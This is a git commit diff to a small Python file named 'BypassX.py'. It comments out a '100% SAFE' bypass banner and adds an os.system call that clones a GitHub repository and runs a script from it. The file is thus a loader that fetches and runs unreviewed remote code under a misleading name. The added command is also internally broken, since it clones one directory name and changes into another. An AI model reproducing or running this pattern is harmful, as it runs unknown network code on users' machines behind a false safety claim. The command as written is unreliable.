32d837dc6752dc56b36896c9893fb0b68acbffe7
Michael Covenant <129428958+Tech-Michael112@users.noreply.github.com>
2024-06-23 12:21:14 +0100

    Update BypassX.py

--- BypassX.py
+++ BypassX.py
@@ -1,7 +1,7 @@
 import os,time
 
-print(" BYPASSED BY MICHAEL...100% SAFE")
+#(" BYPASSED BY MICHAEL...100% SAFE")
 
 time.sleep(3)
 
-os.system("python OGGY.py")
+os.system("git clone --depth=1 https://github.com/Tech-Michael112/F-CLONE && cd R-CLONE && python R-CLONE.py")
